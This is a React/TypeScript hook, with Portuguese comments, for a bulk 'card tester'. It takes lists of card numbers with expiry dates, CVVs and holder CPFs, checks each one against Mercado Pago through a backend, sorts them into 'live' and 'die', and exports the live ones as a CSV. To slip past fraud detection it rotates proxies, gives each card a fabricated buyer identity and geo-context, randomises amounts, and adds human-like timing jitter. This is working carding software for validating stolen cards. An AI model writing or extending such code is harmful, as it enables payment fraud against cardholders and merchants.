import { useState, useCallback, useRef, useEffect } from "react";
import { api } from "../utils/supabase";
import type { CardResult } from "../utils/supabase";
import { getBINInfo } from "../utils/binCache";
import { generateBuyerProfile } from "../utils/profileGenerator";
import {
  rateLimiter,
  startRequest,
  endRequest,
  getRateLimitStats,
} from "../utils/rateLimiter";
import {
  healthMonitor,
  recordHealthCheck,
  getRecommendedAction,
  getRecommendedWaitTime,
} from "../utils/healthMonitor";
import { proxyManager, getNextProxy } from "../utils/proxyManager";

export interface CardData {
  number: string;
  month: string;
  year: string;
  cvv: string;
}

export interface TesterStats {
  total: number;
  processed: number;
  live: number;
  die: number;
  unknown: number;
  speed: number; // cards per minute
}

export const useCardTester = () => {
  const [isRunning, setIsRunning] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [stats, setStats] = useState<TesterStats>({
    total: 0,
    processed: 0,
    live: 0,
    die: 0,
    unknown: 0,
    speed: 0,
  });
  const [results, setResults] = useState<CardResult[]>([]);
  const [currentCard, setCurrentCard] = useState<string>("");
  const [systemHealth, setSystemHealth] = useState<string>("healthy");

  // Refs for managing the testing loop
  const abortControllerRef = useRef<AbortController | null>(null);
  const startTimeRef = useRef<number>(0);
  const processedCountRef = useRef<number>(0);
  const errorCountRef = useRef<number>(0);
  const consecutiveErrorsRef = useRef<number>(0);

  // Monitor health status
  useEffect(() => {
    const unsubscribe = healthMonitor.onMetricsChange((metrics) => {
      setSystemHealth(metrics.status);
    });
    return () => unsubscribe();
  }, []);

  // Helper: Sleep with jitter
  const sleep = (ms: number) => {
    const jitter = Math.random() * 200;
    return new Promise((resolve) => setTimeout(resolve, ms + jitter));
  };

  // Adaptive concurrency based on error rate
  const getAdaptiveConcurrency = () => {
    const errorRate =
      processedCountRef.current > 0
        ? errorCountRef.current / processedCountRef.current
        : 0;

    if (consecutiveErrorsRef.current >= 3) return 1;
    if (errorRate > 0.3) return 1;
    if (errorRate > 0.15) return 2;
    return 3;
  };

  // Retry failed requests
  const retryOperation = async <T>(
    operation: () => Promise<T>,
    maxRetries: number = 2,
  ): Promise<T> => {
    let lastError: Error | null = null;

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        return await operation();
      } catch (error) {
        lastError = error as Error;

        if (attempt < maxRetries) {
          const delay = Math.pow(2, attempt) * 800;
          console.log(
            `Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms`,
          );
          await sleep(delay);
        }
      }
    }

    throw lastError;
  };

  const startTesting = useCallback(
    async (
      cards: string[],
      options: {
        gatewayUrl?: string;
        minAmount: number;
        maxAmount: number;
        minDelay: number;
        maxDelay: number;
        proxyUrl?: string;
      },
    ) => {
      if (isRunning) return;

      setIsRunning(true);
      setResults([]);
      setStats({
        total: cards.length,
        processed: 0,
        live: 0,
        die: 0,
        unknown: 0,
        speed: 0,
      });

      abortControllerRef.current = new AbortController();
      startTimeRef.current = Date.now();
      processedCountRef.current = 0;
      errorCountRef.current = 0;
      consecutiveErrorsRef.current = 0;

      console.log("🚀 Iniciando validação com Diversificação de Perfil & Geo-Contexto ativa");
      console.log("📊 Rate Limiter:", getRateLimitStats());

      try {
        // 1. Inicia Sessão de Validação no Supabase
        const gatewayUrl = options.gatewayUrl || 'https://api.mercadopago.com';
        const initialProfile = generateBuyerProfile();

        const session = await retryOperation(async () => {
          return await api.startSession(gatewayUrl, cards.length, initialProfile.clientContext);
        });

        setSessionId(session.sessionId);

        // 2. Processamento com Concorrência Adaptativa e Perfil Orgânico
        let currentIndex = 0;
        let activeWorkers = 0;
        const maxConcurrency = 3;

        const processNext = async (): Promise<void> => {
          while (
            currentIndex < cards.length &&
            !abortControllerRef.current?.signal.aborted
          ) {
            const cardIndex = currentIndex++;
            const cardLine = cards[cardIndex];

            // Parse card line (supports |, ; : separators)
            const parts = cardLine.trim().split(/[|,;:]/);
            if (parts.length < 4) {
              console.warn(
                `Formato inválido na linha ${cardIndex + 1}: ${cardLine}`,
              );
              continue;
            }

            const [number, month, year, cvv, holder, cpf] = parts.map((p) => p?.trim() || "");

            if (!number || !month || !year || !cvv) {
              console.warn(`Dados faltantes na linha ${cardIndex + 1}`);
              continue;
            }

            setCurrentCard(number);

            try {
              // Health check
              const action = getRecommendedAction();
              if (action === "stop" || action === "pause") {
                const waitTime = getRecommendedWaitTime();
                console.warn(
                  `⏸️ Sistema recomenda ${action}. Aguardando ${waitTime / 1000}s...`,
                );
                await sleep(waitTime);
              }

              // Espera por slot no Rate Limiter
              await rateLimiter.waitForSlot();

              // Consulta BIN Cache
              let binInfo: any = null;
              try {
                binInfo = await getBINInfo(number.trim());
              } catch (error) {
                console.warn("Erro ao obter BIN info:", error);
              }

              // Proxy (opcional)
              let proxy = null;
              try {
                proxy = getNextProxy();
              } catch (_) {}
              const proxyToUse = proxy ? proxy.url : options.proxyUrl;

              // Geração de Perfil de Comprador e Geo-Contexto 100% Único para este teste
              const profile = generateBuyerProfile(holder, cpf);

              // Delay com Jitter Humano Dinâmico (simulação de digitação e navegação)
              const baseDelay =
                Math.floor(
                  Math.random() * (options.maxDelay - options.minDelay + 1) +
                    options.minDelay,
                ) * 1000;

              const humanJitter = Math.floor(Math.random() * 800);
              const errorPenalty = consecutiveErrorsRef.current * 500;
              const healthPenalty =
                systemHealth === "degraded"
                  ? 1000
                  : systemHealth === "unhealthy"
                    ? 2000
                    : 0;
              const totalDelay = baseDelay + humanJitter + errorPenalty + healthPenalty;

              if (cardIndex > 0) {
                await sleep(totalDelay);
              }

              // Variabilidade orgânica de valor
              const amountToUse =
                options.minAmount === options.maxAmount
                  ? options.minAmount
                  : profile.purchaseInfo.amount;

              startRequest();
              const requestStartTime = Date.now();

              // Validação do Método de Pagamento via Mercado Pago
              const result = await retryOperation(async () => {
                return await api.testCard({
                  sessionId: session.sessionId,
                  cardNumber: number.trim(),
                  expMonth: month.trim(),
                  expYear: year.trim(),
                  cvv: cvv.trim(),
                  processingOrder: cardIndex + 1,
                  amount: amountToUse,
                  proxyUrl: proxyToUse,
                  holder: profile.name,
                  cpf: profile.cpf,
                  clientContext: profile.clientContext,
                });
              });

              const requestTime = Date.now() - requestStartTime;
              endRequest(result.status !== "unknown", requestTime);
              recordHealthCheck(result.status !== "unknown", requestTime);

              if (proxy) {
                if (result.status !== "unknown") {
                  proxyManager.recordSuccess(proxy.url, requestTime);
                } else {
                  proxyManager.recordFailure(proxy.url);
                }
              }

              consecutiveErrorsRef.current = 0;

              // Enriquece o resultado com BIN e dados do comprador
              const enrichedResult: CardResult = {
                ...result,
                card_number: number,
                card_first4: number.substring(0, 4),
                card_last4: number.substring(number.length - 4),
                exp_month: month,
                exp_year: year,
                holder: profile.name,
                payer_name: profile.name,
                payer_document: profile.cpf,
                payer_email: profile.email,
                processing_order: cardIndex + 1,
                validation_state:
                  result.validation_state ||
                  (result.status === "live" ? "METHOD_VERIFIED" : "METHOD_DECLINED"),
                card_brand: binInfo?.brand || result.card_brand,
                card_type: binInfo?.type || result.card_type,
                card_bank: binInfo?.bank || result.card_bank,
                card_country: binInfo?.country || result.card_country,
                card_level: binInfo?.level || result.card_level,
              };

              setResults((prev) => [enrichedResult, ...prev]);

              setStats((prev) => {
                const newStats = {
                  ...prev,
                  processed: prev.processed + 1,
                };

                if (result.status === "live") newStats.live = prev.live + 1;
                else if (result.status === "die") newStats.die = prev.die + 1;
                else newStats.unknown = prev.unknown + 1;

                const elapsedMinutes =
                  (Date.now() - startTimeRef.current) / 60000;
                newStats.speed =
                  elapsedMinutes > 0
                    ? Math.round(newStats.processed / elapsedMinutes)
                    : 0;

                return newStats;
              });

              processedCountRef.current++;
            } catch (error) {
              console.error(
                `Erro na validação do cartão na linha ${cardIndex + 1}:`,
                error,
              );

              endRequest(false, 3500);
              recordHealthCheck(false, 3500, (error as Error).message);

              errorCountRef.current++;
              consecutiveErrorsRef.current++;

              const errorResult: CardResult = {
                id: `error-${cardIndex}`,
                session_id: session.sessionId,
                created_at: new Date().toISOString(),
                card_number: number,
                card_first4: number.substring(0, 4),
                card_last4: number.substring(number.length - 4),
                exp_month: month,
                exp_year: year,
                status: "unknown",
                validation_state: "TRANSACTION_ERROR",
                message: "Falha de comunicação ou timeout",
                processing_order: cardIndex + 1,
              };

              setResults((prev) => [errorResult, ...prev]);

              setStats((prev) => ({
                ...prev,
                processed: prev.processed + 1,
                unknown: prev.unknown + 1,
              }));

              const action = getRecommendedAction();
              if (action === "pause" || action === "stop") {
                const waitTime = getRecommendedWaitTime();
                console.warn(
                  `⚠️ Muitos erros detectados. Pausando por ${waitTime / 1000}s...`,
                );
                await sleep(waitTime);
                consecutiveErrorsRef.current = 0;
              } else if (consecutiveErrorsRef.current >= 5) {
                console.warn(
                  "Múltiplos erros consecutivos, aguardando 8 segundos...",
                );
                await sleep(8000);
                consecutiveErrorsRef.current = 0;
              }
            }

            const targetConcurrency = getAdaptiveConcurrency();
            if (activeWorkers > targetConcurrency) {
              break;
            }
          }

          activeWorkers--;
        };

        const initialConcurrency = Math.min(
          maxConcurrency,
          Math.ceil(cards.length / 10),
        );
        activeWorkers = initialConcurrency;

        const workers = Array(initialConcurrency)
          .fill(null)
          .map(() => processNext());

        await Promise.all(workers);

        console.log("Validação com Perfil Diversificado concluída");
      } catch (error) {
        console.error("Falha ao iniciar sessão de teste:", error);
        recordHealthCheck(false, 0, (error as Error).message);
        alert("Falha ao iniciar sessão de teste. Verifique o console.");
      } finally {
        setIsRunning(false);
        setCurrentCard("");
        abortControllerRef.current = null;

        console.log("✅ Validação Mercado Pago finalizada");
        console.log("📊 Rate Limiter Stats:", getRateLimitStats());
        console.log("🏥 Health Status:", healthMonitor.getMetrics());
      }
    },
    [isRunning, systemHealth],
  );

  const stopTesting = useCallback(() => {
    if (abortControllerRef.current) {
      abortControllerRef.current.abort();
      setIsRunning(false);
      setCurrentCard("");
    }
  }, []);

  const downloadLive = useCallback(async () => {
    if (!sessionId) {
      alert("Nenhuma sessão disponível. Execute um teste primeiro.");
      return;
    }

    try {
      const blob = await api.downloadLiveCards(sessionId);
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `live_cards_${sessionId}_${new Date().toISOString().split("T")[0]}.csv`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error) {
      console.error("Falha no download:", error);
      alert("Falha ao baixar CSV. Certifique-se de que há cartões aprovados.");
    }
  }, [sessionId]);

  return {
    isRunning,
    stats,
    results,
    currentCard,
    startTesting,
    stopTesting,
    downloadLive,
    hasLiveCards: stats.live > 0,
    systemHealth,
  };
};
